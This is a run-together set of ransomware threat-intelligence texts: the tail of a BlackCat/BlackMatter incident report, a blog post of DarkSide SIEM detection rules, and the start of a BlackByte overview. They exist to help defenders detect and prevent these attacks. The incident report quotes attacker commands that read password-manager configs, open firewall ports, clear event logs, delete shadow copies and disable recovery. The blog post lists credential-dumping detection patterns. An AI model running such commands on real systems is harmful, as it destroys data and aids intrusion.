/range:192.168.0.0-192.168.255.255\n\nhttps://www.google.com/url?q=https://github.com/moonD4rk/HackBrowserData&sa=D&source=editors&ust=1647513308811062&usg=AOvVaw0NnwQ5SUx6ZclAIabgKA3E\nhttps://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&sa=D&source=editors&ust=1647513308812407&usg=AOvVaw1E7ojK7_bE5XWmXquUqS7v\nhttps://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&sa=D&source=editors&ust=1647513308812562&usg=AOvVaw3nuK7JlPancaktWco5wqg7\nhttps://www.google.com/url?q=https://www.softperfect.com/products/networkscanner/&sa=D&source=editors&ust=1647513308812711&usg=AOvVaw2Nm7MRzizrRqPDOW-cJq_M\n\n\n8/15\n\n \n\nADRecon was also used to collect information from Active Directory and its key servers.\n\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\adrecon.ps1\n\n \nDuring the BlackMatter attack, the attackers also searched for additional ways to maintain\naccess. For example, the following command shows the attackers exploring an existing\nTeamViewer installation:\n\ncmd.exe /q /c teamviewer.exe --getid cmd.exe /q /c dir c:\"program files cmd.exe /q /c\ndir c:\"program files (x86) 1 cmd.exe /q /c dir c:\"program files (x86)\\teamviewer\\\ncmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe --getid\n\ncmd.exe /q /c c:\"program files (x86)\\teamviewer\\teamviewer.exe -info \n\n \nThe following commands show the attackers exploring the keepass password manager\nconfig:\n\ncmd.exe /q /c dir c:\"program files (x86)\\\n\ncmd.exe /q /c dir c:\"program files (x86)\"keepass password safe 2\\\n\ncmd.exe /q /c type c:\"program files (x86)\"keepass password safe\n2\\keepass.exe.config \n\n \n\n \n\nLateral movement\n\nWe observed lateral movement using three main tools and techniques, including Impacket's\nwmiexec, PowerShell using WinRM service and Microsoft Remote Desktop.\n\nImpacket's WMIExec provides a shell on remote systems that have the WMI service\nexposed. We observed its use in both the BlackCat and BlackMatter attacks. This tool's\nactivity can be detected by detecting processes created by wmipsrv.exe that terminate with\nthe following string:\n\n1> \\\\127.0.0.1\\admin$\\__<timestamp>.<6 digits> 2>&1\n\n \nThis tool was often used to issue a command to allow WinRM service network connections\n\nhttps://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&sa=D&source=editors&ust=1647513308815173&usg=AOvVaw0J5ExBm0XnrymkRAcHUPad\nhttps://www.google.com/url?q=https://github.com/SecureAuthCorp/impacket&sa=D&source=editors&ust=1647513308815448&usg=AOvVaw0UneQwYYA1gijAOtqPy1yQ\n\n\n9/15\n\nthrough the firewall, possibly for the convenience of using some prepared scripts:\n\ncmd.exe /q /c netsh advfirewall firewall add rule name=service dir=in protocol=tcp\nlocalport=5985 action=permit 1> \\\\127.0.0.1\\c$\\windows\\temp\\qaiumg 2>&1\n\n \nWinRM allows attackers to use PowerShell to execute commands on remote machines. This\ntool can be detected by searching for processes started by \"wsmprovhost.exe\". Below,\nthere's a few examples of WinRM being used for lateral movement, in this case, to disable\nlogging of many Windows services:\n\nc:\\windows\\system32\\wevtutil.exe set-log active directory web services /enabled:false\n\nc:\\windows\\system32\\wevtutil.exe set-log application /enabled:false\n\nc:\\windows\\system32\\wevtutil.exe set-log hardwareevents /enabled:false\n\nc:\\windows\\system32\\wevtutil.exe set-log internet explorer /enabled:false\n\n \nMicrosoft Remote Desktop was also used by the attackers to obtain GUI access to systems.\nThe following impacket command was issued before the adversary could gain remote admin\naccess.\n\ncmd.exe /q /c reg add hkey_local_machine\\system\\currentcontrolset\\control\\lsa /v\ndisablerestrictedadmin /t reg_dword /d 0 1> \\\\127.0.0.1\\admin\\$\\__<timestamp>\\.<num>\n2>&1\n\n \nOther lateral movement techniques observed include PsEexec on both attacks and RemCom\n— an open-source version of psexec — during the BlackMatter attack.\n\nCommand and control\n\nInterestingly, due to what seems to be an OPSEC mistake using the attacker's shell upload\nand download command, they revealed the use of Kali Linux to execute remote commands.\n\ncmd.exe /q /c #upload c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc> 1>\n\\\\127.0.0.1\\admin$\\<num>.<num> 2>&1\n\ncmd.exe /q /c #download c:\\users\\<user>\\documents\\<doc> /home/kali/desktop/<doc>\n1> \\\\127.0.0.1\\admin$\\<num>.<num> 2>&1\n\n \nIt is unlikely that the attackers had a Kali Linux installation inside the victim's network, so\nremote control of the systems was likely achieved through the SSH tunnels described earlier.\n\n\n\n10/15\n\nExfiltration\n\nAlthough we observed a suspiciously large number of documents opened and screenshots\ntaken from one of the compromised systems, we did not identify techniques used to exfiltrate\ndata from the network. It is possible that document exfiltration is carried out by the execution\nof upload/download commands similar to the ones listed above.\n\nImpact\n\nIn both attacks, before the actual execution of the ransomware, the attackers performed\nseveral actions preparing systems to make the execution as successful as possible. On the\nday of the attack, the attacker logged in to the domain controller and opened the group policy\nmanagement interface. The attackers then dropped and executed a file named \"apply.ps1.\"\nWe believe this script created and prepared the group policy to cause the execution of the\nransomware throughout the domain.\n\nc:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -exec bypass .\\apply.ps1\n\n \nThis execution results in the immediate writing of group policy files to disk and is followed by\nthe execution of the following command to force the deployment of the group policy:\n\ncmd.exe /q /c gpupdate /force\n\n \nA few minutes before BlackCat ransomware started encrypting files, the attackers executed\na script called \"defender.vbs\":\n\ncmd.exe /c \\\\<domaincontroller>\\netlogon\\defender.vbs\n\n \nIn the BlackMatter attack, the exact same file was named \"def.vbs\" and executed minutes\nbefore the encryption began:\n\ncmd.exe /c \\\\<domaincontroller>\\netlogon\\def.vbs\n\n \nWe believe this is part of the attack, but at this time do not know the exact role of this script.\n\nWhen encryption begins, the ransomware file named <num>.exe in the BlackCat attack and,\nsimilarly, <num>.exe in the BlackMatter attack, was dropped on the domain servers inside\nthe SYSVOL folder, making it accessible on the NETLOGON network share, accessible by\nall users in the domain. File encryption makes all systems execute these files from the\nremote share.\n\nBlackCat attack:\n\n\n\n11/15\n\n \ncmd.exe -c \\\\<domain controller>\\netlogon\\<num>.exe --access-token <token>\n\n \nBlackMatter attack:\n\n \n\ncmd.exe -c \\\\<domain controller>\\netlogon\\<num>.exe\n\n \nThe following variations of the BlackCat command were observed:\n\n<num>.exe --access-token <token> /f\n\n<num>.exe --access-token <token> --no-prop-servers \\\\<hostname> --propagated\n\n<num>.exe -access-token <token> -v -p \\\\<hostname>\\scans\n\n<num>.exe --access-token <token>\n\n<num>.exe --child --access-token <token>\n\n<num>.exe -access-token <token> -v -p .\n\n \n \nThe BlackCat executable deployed other commands to make its execution more effective:\n\nc:\\windows\\system32\\cmd.exe /c fsutil behavior set symlinkevaluation r2l:1\n\nc:\\windows\\system32\\cmd.exe /c reg add\nhkey_local_machine\\system\\currentcontrolset\\services\\lanmanserver\\parameters /v\nmaxmpxct /d 65535 /t reg_dword /f c:\\windows\\system32\\cmd.exe /c fsutil behavior set\nsymlinkevaluation r2r:1 c:\\windows\\system32\\cmd.exe /c vssadmin.exe delete\nshadows /all /quiet c:\\windows\\system32\\cmd.exe /c wmic.exe shadowcopy delete\nc:\\windows\\system32\\cmd.exe /c arp -a c:\\windows\\system32\\cmd.exe /c bcdedit /set\n{default} c:\\windows\\system32\\cmd.exe /c cmd.exe /c for /f \"tokens=*\" %1 in\n('wevtutil.exe el') do wevtutil.exe cl \"%1\" c:\\windows\\system32\\cmd.exe /c bcdedit /set\n{default} recoveryenabled no\n\n \n \n \n\nConclusion\n\n\n\n12/15\n\n \nBlackCat first surfaced in November 2021, with the attack we described here taking place in\nDecember 2021. While we don't know how related BlackCat is to BlackMatter, we assess\nwith moderate confidence that based on the tools and techniques of these attacks and\noverlapping infrastructure, BlackMatter affiliates were likely among the early adopters of\nBlackCat.\n\nAs we have seen several times before, RaaS services come and go. Their affiliates,\nhowever, are likely to simply move on to a new service. And with them, many of the TTPs are\nlikely to persist.\n\nOne key aspect of these attacks is that adversaries take time exploring the environment and\npreparing it for a successful and broad attack before launching the ransomware, at which\npoint every second means lost data. Therefore, it is key that the attack is detected in its early\nstages.\n\nThe two attacks described here took over 15 days to reach the encryption stage. Knowing\nthe attackers tools and techniques and having monitoring and response processes in place\ncould have prevented the successful encryption of the companies files.\n\nTalos will continue to monitor RaaS and their affiliates activities and provide intelligence,\ndetection rules and indicators to help defenders as they work to protect their networks.\n\nIOCs\n\n \nDomains - Common:\n\n \nwindows[.]menu\n\nIP's - Common:\n\n \n52.149.228[.]45\n\n20.46.245[.]56\n\nHashes - Common:\n\n \nApply.ps1\n\nD97088F9795F278BB6B732D57F42CBD725A6139AFE13E31AE832A5C947099676\n\ndefender.vbs\n\nB54DD21019AD75047CE74FE0A0E608F56769933556AED22D25F4F8B01EE0DA15\n\n\n\n13/15\n\nHashes - BlackCat:\n\n \nReverse-ssh (compiled with hardcoded domain):\n\n47AFFAED55D85E1EBE29CF6784DA7E9CDBD86020DF8B2E9162A0B1A67F092DCD\n\nstealer:\n\n65DBAFE9963CB15CE3406DE50E007408DE7D12C98668DE5DA10386693AA6CD73\n\nBlackcat ransomware:\n\n060CA3F63F38B7804420729CDE3FC30D126C2A0FFC0104B8E698F78EDAB96767\n\nHashes - BlackMatter:\n\n \nBlackMatter ransomware:\n\n706F3EEC328E91FF7F66C8F0A2FB9B556325C153A329A2062DC85879C540839D\n\nCoverage\n\n \nWays our customers can detect and block this threat are listed below.\n\n\n\n14/15\n\n \n\nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the\nexecution of the malware detailed in this post.

The aim of this blog post is to provide you with\n\nactionable prevention’s and detection’s against known TTPs which have been seen during\n\nDarkSide ransomware operations from the group and their affiliates.\n\nIt is important to note that many of these prevention’s and detection’s will work not only for\n\nthis group, but for preventing and detecting attacks from many threat actors due to their\n\ngeneric nature.\n\nThis thread was in response to the fantastic blog post by FireEye – “Shining a Light on\n\nDARKSIDE Ransomware Operations” released on the 10th of May.\n\nBefore getting into the post, here are some further reading resources on DarkSide if you are\n\ninterested.\n\nhttps://blueteamblog.com/darkside-ransomware-operations-preventions-and-detections\nhttps://blueteamblog.com/author/auth0r\nhttps://blueteamblog.com/category/cybersecurity\nhttps://blueteamblog.com/category/siem\nhttps://blueteamblog.com/category/threat-hunting\nhttps://blueteamblog.com/category/threat-intelligence\nhttps://blueteamblog.com/darkside-ransomware-operations-preventions-and-detections#respond\nhttps://twitter.com/blueteamblog/status/1392626970446417922?s=20.\nhttps://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html\n\n\n2/10\n\nTime to get into the detection’s and prevention’s. I have listed a large number of SIEM rules\n\nbelow which I have had stored on a personal database for a while. I can’t remember exactly\n\nwho created each and every one of them (Various people – it wasn’t me) – but apologies\n\nthat I am unable to give particular credits for these. I know some were created by Florian\n\nRoth, Samir Bousseaden, Markus Neis and Roberto Rodriguez. I hope however sharing\n\nthem will make up for this in providing further detection’s to the community.\n\nAlso, for all the SIEM rules I have listed below, keep sure of three things if you create them.\n\n1. Do you have the correct auditing configured, 2. Are the logs in your SIEM, 3. Are the\n\nproperties being parsed correctly. If any of these answer no, they won’t work.\n\nINITIAL COMPROMISE\n\nPassword attacks on perimeter\n\nThe first initial compromise method mentioned was password spray attacks against VPNs.\n\nThis is extremely common, but luckily for us relatively easy to protect against compared to\n\nother attack vectors. Password spray attacks and brute forces will happen not just against\n\nVPN’s but any public facing authentication methods, such as Azure Active Directory.\n\nI know everyone says this, but they say it for a reason – Multi-factor authentication should be\n\nused for all accounts in your network. Also ensure users are using unique passwords for each\n\nservice / platform they have access too. This will make the likelihood of a password attack\n\nbreaching your perimeter a lot lower. You also want to ensure you have lockout thresholds\n\nfor failed logins to any accounts. If an attacker is attempting various password attacks, this\n\nmay at least slow them down whilst you react to alerts.\n\nIn terms of detection’s, there are a number of things we want to look for. Do your best to\n\nensure all perimeter facing devices are on boarded to your SIEM so you can monitor\n\nauthentication events.\n\nPassword Spraying – Create an alert looking for one Source IP failing to login to 5+\n\nAccounts within 20 minutes. (This is just an example, you will need to modify the\n\nthresholds depending on the log type and your environment.)\n\nImpossible Travel – Most SIEM’s have a function to detect the geographic location\n\nof IP addresses. Monitor if a user account logs in successfully from 2 different countries\n\nwithin an hour. (You may need to allowlist any VPN providers which are commonly\n\nused by your user base)\n\n\n\n3/10\n\nAttempted user login from multiple Sources – A sign of potentially leaked user\n\ncredentials or password cracking is when there is numerous successful or failed logins\n\nto one user account from multiple IPs in a day. Create an alert looking for 5 IPs\n\nsuccessfully or failing to login to the same user account in a 24 hour period (As\n\nprevious, you may need to alert thresholds depending on your environment and risk\n\nappetite)\n\nOther – It is also worth looking at creating rules looking for large numbers of failed\n\nlogins to one account, large numbers of failed logins from one source and large\n\nnumbers of failed logins to one destination. The thresholds and exceptions you will use\n\nfor these will depend greatly on what you are monitoring and your environment. Run\n\nsome queries, find what is normal and alert above that.\n\nFinally for this section, it is mentioned in the report that attackers may have used a\n\nvulnerability in SonicWall to disable MFA on the VPN.\n\nI always recommend that you audit change events on any networking equipment in your\n\nenvironment. You likely have VPN’s, Firewall’s and a plethora of other networking\n\nequipment logging network traffic and authentications – keep sure you are also auditing and\n\nlogging change activities on these too.\n\nLook for events such as deletions, creations and modifications of objects, policies and\n\naccounts on these devices. Alert on them and ensure that any changes are legitimate and\n\nexpected.\n\nMalicious Emails\n\nIt is mentioned that another initial access vector was, unsurprisingly; malicious emails.\n\nI’m not going to cover email security and all its facets here. Rather, this tweet from\n\n@TinkerSec at the time sums up up the basics pretty well. Look into each of these aspects\n\nseparately and see if you have them, or a direct alternative; in place.\n\nSo plan on it.\n  \n\n– Use email security proxies to conduct scans of attachments ahead of time.\n – Use endpoint protection.\n\n – Use outbound domain inspection.\n  \n\n– Have a way for users to report phishes.\n – Don't punish users if they self report.\n\n— Tinker (@TinkerSec) May 11, 2021\n\nESTABLISH FOOTHOLD\n\nhttps://twitter.com/TinkerSec/status/1392196981733445635?ref_src=twsrc%5Etfw\n\n\n4/10\n\nBEACON\n\nThis is mentioned in this phase and also for lateral movement, but I will just include it here.\n\nBeacon / Cobaltstrike is now known for being used in a large number of intrusions to\n\nperform numerous functions (which you can learn about in the below link)\n\nTo hunt for it, detect it or are looking for IOCs, this is your go-to link.\n\nAwesome-CobaltStrike-Defense contains the following topics and is regularly updated.\n\nHunting and Detection Tools\n\nYara Rules\n\nSigma Rules\n\nIOCs\n\nResearch articles\n\nTrainings\n\nVideos\n\nMAINTAIN PERSISTENCE\n\nTeamviewer / Anydesk and other remote acccess applications\n\nThe report shows us that the threat actor downloaded and used Teamviewer. They also\n\nbrowsed to locations indicating downloads of Anydesk. I would recommend that, if possible;\n\nyour business mandates one remote access application which is allowed to be used. Then,\n\nanything outside this is immediately suspicious.\n\nIn terms of alerting, we should approach this from two avenues. Firstly, I recommend you\n\nlook for outbound connections on the following ports which are used by common remote\n\naccess applications.\n\nRDP – 3389\n\n \nAnydesk – 6568\n\nDameware – 6129, 6130, 6132, 6133\n\n \nTeamviewer – 5938\n\n \nVNC – 5800/5900\n\nIf your business does mandate the use of one, or no; remote access applications. Block the\n\ndownload links for these and then alert if there is a blocked connection to these download\n\nURLs (such as hxxps://dl.teamviewer[.]com/download)\n\nLegitimate Credentials\n\nhttps://github.com/MichaelKoczwara/Awesome-CobaltStrike-Defence\n\n\n5/10\n\nThis is difficult to deal with and is a huge challenge that we face, as threat actors purchase\n\nworking user credentials and log directly into systems. There is some steps that we can take\n\nhowever.\n\nFirstly, sign up for domain monitoring on haveibeenpwned. If an employees credentials\n\nare breached, ensure that they reset their password to a new, complete different one.\n\nInform users to create unique, lengthy passwords for all services. Therefore, if an\n\nattackers does buy a credential it will only work on one of the applications / services\n\netc.\n\nI mentioned it already, but MFA on everything. Then, if a password is breached, you\n\nhave another layer of defense.\n\nIn terms of detection’s, for this we really need to look at anomalous behaviour patterns, such\n\nas.\n\nUsers accessing, or attempting to access; a host they have never accessed before.\n\nUser logging or attempting to login outside of their normal working hours.\n\nMentioned already above, but Impossible Travel scenarios can be a good way of\n\ncatching legtimate credentials being used.\n\nFor your critical servers / hosts (Domain Controllers, Network Devices, Exchange\n\nServers, Databases etc – whatever you consider critical) you should know who\n\n(Domain Admins, Network Admins etc) is allowed to access these. Create an alert if any\n\nusers outside this accesses, or attempts to access; your critical servers and hosts.\n\nESCALATE PRIVILEGES\n\nMimikatz\n\nMimikatz is another tool which commonly used during many attacks, especially for privilege\n\nescalation.\n\nDue to its common usage, it is worth taking your time to mitigate as many potential attacks\n\nas possible. The following articles detail numerous mitigation’s which can be taken against\n\nMimikatz.\n\nSANS – Mitigations against Mimikatz style attacks.\n\nTempest Security – Mitigating credential theft attacks.\n\nOnce you have mitigated potential issues, it is then worth implementing the below\n\ndetection’s. Mimikatz does so much it is hard to list a detection for everything that it can do,\n\nso here are the more common ones.\n\nThere are 3 good Sysmon detection’s in this Medium post.\n\nhttps://haveibeenpwned.com/DomainSearch\nhttps://isc.sans.edu/forums/diary/Mitigations+against+Mimikatz+Style+Attacks/24612/\nhttps://sidechannel.tempestsi.com/mimikatz-mitigating-credential-theft-attacks-5fdeabdc1622\nhttps://medium.com/@levurge/detecting-mimikatz-with-sysmon-f6a96669747e\n\n\n6/10\n\nSigma rule to detect well-known mimikatz command line arguments\n\nSigma rule to detect mimikatz keywords in different Windows Eventlogs\n\nMimikatz DC Sync. (When Mimikatz is used to perform DCSync) EventID 4662,\n\nProperties contain *Replicating Directory Changes All* and/or *1131f6ad-9c07-11d1-\n\nf79f-00c04fc2dcd2*\n\nMimikatz Detection LSASS Access (Mimikatz normal behaviour) Sysmon Event\n\n10, Target Image C:\\windows\\system32\\lsass.exe, Granted Access”0x1410″\n\nCredential Dumping Service Execution. (Looking for services known to be used\n\nto dump credentials) Event ID 7045 or 4697 and ServiceName contains “Mimikatz or\n\nmimidrv or gsecdump or cachedump or pwdump or wce service or wceservice or\n\nfgexec.”\n\nOverPass The Hash. (Detection of successful overpass the hash attack) Event ID =\n\n4624, Logon Type = 9, Logon Process Name = seclogo, Authentication Package =\n\nNegotiate\n\nLSASS Memory Dump\n\nCommonly at this phase of an attack, attackers will look to dump the memory from LSASS\n\nand other attacks against the service.\n\nI highly recommend reading this threat detection report by RedCanary. It explains well what\n\nLSASS is, why it is attacked so frequently and several detection’s for these attacks.\n\nI also recommend reviewing the MITRE sub technique – OS Credential Dumping: LSASS\n\nMemory . This provides further extra information and resources around what LSASS is,\n\npotential mitigation’s and detection’s.\n\nSome detection’s which are relating to LSASS below (I also listed some in the previous\n\nsection as Mimikatz targets LSASS)\n\nLSASS Access from Non System Account. EventID 4663 or 4665. Object Type =\n\nProcess, Object Name ends with lsass.exe. SubjectUsername does not end with $.\n\nPassword Dumper activity on LSASS. EventID 4656. Process Name =\n\nC:\\Windows\\System32\\lsass.exe. AccessMask = 0x705. ObjectType = SAM_DOMAIN.\n\nLSASS Memory Dumping. Windows Process Creation. CommandLine contains\n\nlsass and .dmp. CommandLine does not end with .werfault.exe OR CommandLine does\n\nnot end with .exe and contain procdump.\n\nMOVE LATERALLY\n\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_mimikatz_command_line.yml\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_alert_mimikatz_keywords.yml\nhttps://redcanary.com/threat-detection-report/techniques/lsass-memory/\nhttps://attack.mitre.org/techniques/T1003/001/\n\n\n7/10\n\nRDP\n\nRDP has been used extensively by many threat actors for lateral movement among other\n\npurposes, therefore it is important we monitor its the best we can.\n\nBut before we get to the detection stage, as always lets first try to mitigate. MITRE have some\n\nfantastic mitgations listed here which I highly recommend following to deter and make an\n\nattackers life more difficult.\n\nNow onto the detection’s. RDP is such a frequently used protocol during attacks, so I am\n\ngoing to list a bunch of my favourites below which I recommend looking into.\n\nUser RDP Spike. Alert on a user making numerous RDP connections in a short\n\nperiod.\n\nAbnormal RDP Access. Alert on devices being accessed via RDP which are not\n\nnormally accessed using the protocol.\n\nSource with many Destinations. Alert on a Source IP with a large number of\n\nDestination IPs in a 24 hour period using RDP.\n\nPossible RDP Tunneling. Look for EventID 4624, Logon Type 10, Source Address =\n\n127.0.0.1 or ::1\n\nNetsh RDP Port Forwarding. Look for EventID 4688 where CommandLine = netsh\n\ni* p*=3389 c*\n\nPotential tsclient being used to place RDP Backdoor. Sysmon Event 11, Image:\n\n‘\\mstsc.exe’, TargetFileName: ‘\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*’\n\nSuspicious Outbound RDP Connections. Sysmon Event 3, Destination Port 3389.\n\nImage is not any of mstsc.exe, RTSApp.exe, RTS2App.exe, RDCMan.exe,\n\nws_TunnelService.exe, RSSensor.exe, RemoteDesktopManagerFree.exe,\n\nRemoteDesktopManager.exe, RemoteDesktopManager64.exe, mRemoteNG.exe,\n\nmRemote.exe, Terminals.exe, spiceworks-finder.exe, FSDiscovery.exe,\n\nFSAssessment.exe, MobaRTE.exe, chrome.exe, thor.exe, thor64.exe.\n\nINTERNAL RECONNAISSANCE\n\n \nPowerview / Bloodhound\n\nThreat actors commonly use tools such as Powerview and Bloodhound to perform internal\n\nrecon against Windows targets.\n\nhttps://attack.mitre.org/techniques/T1021/001/\n\n\n8/10\n\nMy main recommendation here? Run them yourself first. Find and fix the weaknesses before\n\nthey do. I discussed Active Directory Security Hardening, Auditing and Detection Rules on a\n\npost a while ago. I recommend giving it a read and following the steps outlined within.\n\nThere are some SIEM rules which we can look to implement to pick up the activity from these\n\ntools.\n\nPowerview Add-DomainObjectAcl DCSync AD Extend Right. (Detects\n\nPowerView being used to grant DCSync permissions to a user. Only false positve is if a\n\nnew DC Account is being created) EventID 5136. LDAPDisplayName =\n\nntSecurityDescriptor. Value contains either 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 OR\n\n1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 OR 89e95b76-444d-4c62-991a-0facbeda640c.\n\nUse of Bloodhound and Sharphound. There is a nice Sigma rule here.\n\nBuilt in Windows Utilities\n\nFrequently we see threat actors using built in Windows utilities to aid their reconnaissance\n\nand attacks in general. Outside of this incident, we can also see this when we look at reports\n\nfrom the likes of TheDFIRReport. Almost every post, there is evidence of an attacker using\n\nthese in built utilities.\n\nTherefore, we have to try and detect this. Between the DFIRReport link above and JPCert –\n\nWindows Commands used by Attackers we can quickly build a list of frequently used\n\ncommands.\n\nIt is worth taking these commands and creating a rule looking for a user running 5+ of them\n\nin 5 minutes. (You may need to change your thresholds). You will need to allow list Domain\n\nAdmins, Network Admins and potentially other staff members depending on role.\n\nOn top of this, there are a number of other good built in recon rules which can be found in\n\nthis Sigma repository and search for recon.\n\nAdvanced IP Scanner\n\nDuring most reconnaissance attackers will run various network scans to fingerprint the\n\ntarget environment and find vulnerable devices, open ports etc.\n\nBefore we get into the detection’s, the best mitigation here is to ensure only required ports\n\nare open on devices. This will limit what an attacker can find out about your devices, or at\n\nleast make the job more difficult in the worst case.\n\nIt is therefore important that we monitor for suspicious network activity. I wrote this blog\n\npost a while back, it needs updated but contains some basic logic around network\n\nmonitoring. If you have DNS logs, also take a look at this post.\n\nhttps://blueteamblog.com/active-directory-security-hardening-auditing-and-detection-rules\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_hack_bloodhound.yml\nhttps://thedfirreport.com/\nhttps://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\nhttps://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation\nhttps://blueteamblog.com/8-ways-to-detect-malicious-firewall-traffic-using-siem\nhttps://blueteamblog.com/7-ways-to-detect-malicious-dns-traffic-using-siem\n\n\n9/10\n\nOn top of the two above articles you should also be looking for things such as –\n\nTelnet / SSH – Source IP with many destinations in a day (Strange – these is a\n\nmanagement port – investigate why)\n\nAbnormal spike in traffic from a host. Either based on Event Count and/or Data\n\nVolume. This can be abnormal either to your environment, subnet or the host itself\n\ncompared to its previous traffic.\n\nBasic Port Scans within your network. Look at internal traffic only. Then alert on if 1\n\nSource IP connects to either 100 destinations on the same port within 5 minutes or 1\n\ndestination over 100 ports in 5 minutes. (These thresholds may need modified and you\n\nmay need to allowlist certain devices such as vulnerability scanners)\n\nCOMPLETE MISSION\n\nPSExec\n\nPSExec has been seen during DarkSide ransomware attacks to deploy the ransomware itself.\n\nIn terms of what PSExec is, why threat actors use it and how we can detect it; the following\n\ntwo posts are fantastic.\n\nFirstly, Praetorian – Threat Hunting: How to Detect PsExec. This contains details on what it\n\nis, how to detect, variants of PSExec and further considerations.\n\nNext up, another great RedCanary post. Threat Hunting for PsExec, Open-Source Clones,\n\nand Other Lateral Movement Tools. This contains similar detail on PSExec but goes on to\n\nfocus on the many clones of PSExed, what they are, and how we can detect them also.\n\nFINAL THOUGHTS\n\nBefore we finish, I have some final thoughts which I thought were best to mention at the end\n\nrather than throughout the rest of the post.\n\nPatch – I know this can be easier said than done at times, but it can be the difference\n\nbetween being breached, and not. Most attacks, if the breach itself wasn’t due to a\n\nvulnerability; the attackers was able as part of their attack chain to exploit some vulnerability\n\nto speed up their attack or bypass defenses. Do your best to limit their opportunities to do\n\nthis.\n\nTest your prevention’s and detection’s – Once you have mitigation’s and detection’s in\n\nplace, test them. Are things really being blocked? Do alerts really trigger in your SIEM?\n\nTesting your hard work is a vital step in the process which should never be skipped.\n\nhttps://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/\nhttps://redcanary.com/blog/threat-hunting-psexec-lateral-movement/\n\n\n10/10\n\nResponse – If a serious incident does occur – do you have an IR team? Do you have one on\n\nretainer? Have you played out scenarios and went through the how, who and why you will\n\nrespond to a real event? There are some fantastic Incident Response resources here.\n\nThanks for taking your time to read this blog post and I hope you found it useful. I always\n\nlove feedback, so contact me at My Twitter if you want to discuss this article, or anything\n\nrelated.\n\nLeave a Reply\n\nYour email address will not be published.

According to the alert, BlackByte ransomware attacks on critical US infrastructures are on the rise. In this blog, we explained TTPs\nused by the BlackByte ransomware group in detail.\n\nTest your security controls against ransomware\n\nBlackByte Ransomware Group\n\nThe BlackByte group is a Ransomware-as-a-Service (RaaS) operator and started its ransomware operation in July 2021. Since then, they\nhave targeted US-based organizations in critical infrastructure sectors such as government, finance, and food & agriculture. Also, they\ncompromised the network of the famous American football team, San Francisco 49ers, and released some of the confidential data belonging to\nthe team as proof of the attack. \n\nhttps://www.picussecurity.com/resource/ttps-used-by-blackbyte-ransomware-targeting-critical-infrastructure\nhttps://www.ic3.gov/Media/News/2022/220211.pdf\nhttps://www.picussecurity.com/request-demo-red-team?hsLang=en-gb\n\n\n2/7\n\nFigure 1: Ransom note of BlackByte for SF49ers[1]\n\nJoint cybersecurity advisory from FBI and US Secret Service warns organizations that beware of the IOCs of BlackByte ransomware attacks\nand take necessary precautions as the number of attacks is expected to increase.\n\nWhat is BlackByte Ransomware?\n\nBlackByte ransomware is the collective name of the ransomware variants from the BlackByte RaaS group. The ransomware was first reported\nback in July 2021. It exploits ProxyShell vulnerabilities found in Microsoft Exchange Server for initial access. The patch for these vulnerabilities\nis available. However, unpatched systems are falling victim to these ransomware attacks. Check out our blog post and learn how to prevent the\nexploitation of ProxyShell vulnerabilities.\n\nThe ransomware does not attack the infected systems if the language setting is Russian or the languages of former Soviet republics. This\nbehavior is similar to some other ransomware threat groups, as explained in our previous ransomware blog, LockBit 2.0. \n\nBlackByte ransomware variants only use symmetric encryption. In their earlier ransomware variants, The BlackByte threat group distributed\nthe encryption key to every victim from their command and control (C2) server in a .png file. Since the same encryption key is used for every\nvictim, Trustwave was able to devise a global decryptor [2]. After the release of the global decryptor, the ransomware group stopped delivering\nthe encryption key from the C2 server and changed the key. Although the decryptor might not work in some cases, it is worth a try as it does\nnot harm already encrypted files. \n\nAfter encrypting the victim files, BlackByte ransomware appends the .blackbyte extension. The ransomware leaves the same ransom note in\nall encrypted directories, and the ransom note includes a .onion link that instructs the victim how to pay the ransom and receive the decryption\nkey. Also, the ransom note claims that the ransomware has exfiltrated data from its victims to scare its victims to pay the ransom.\n\nHow Picus Helps Simulate BlackByte Ransomware?\n\nUsing the Picus Continuous Security Validation Platform, you can test your security controls against the BlackByte ransomware. We advise\nyou to simulate BlackByte ransomware attacks and determine whether your security controls can prevent them or not. Picus Threat Library\nincludes the following threats to simulate BlackByte ransomware.\n\nThreat Name\n\nBlackByte Ransomware .EXE File Download (1-variant)\n\nBlackByte Ransomware Scenario\n\nTest your security controls against ransomware now\n\nMITRE ATT&CK Techniques Used by the BlackByte Ransomware\n\nhttps://www.picussecurity.com/resource/simulating-and-preventing-proxyshell-exchange-exploits?hsLang=en-gb\nhttps://www.picussecurity.com/resource/lockbit-2.0-ransomware-ttps-used-in-emerging-ransomware-campaigns?hsLang=en-gb\nhttps://www.picussecurity.com/product/picus-threat-library?hsLang=en-gb\nhttps://www.picussecurity.com/request-demo-red-team?hsLang=en-gb\n\n\n3/7\n\nReconnaissance\n\nT1595.002 Active Scanning: Vulnerability Scanning\n\nThe Blackbyte ransomware group exploits several vulnerabilities in the Microsoft Exchange Server.

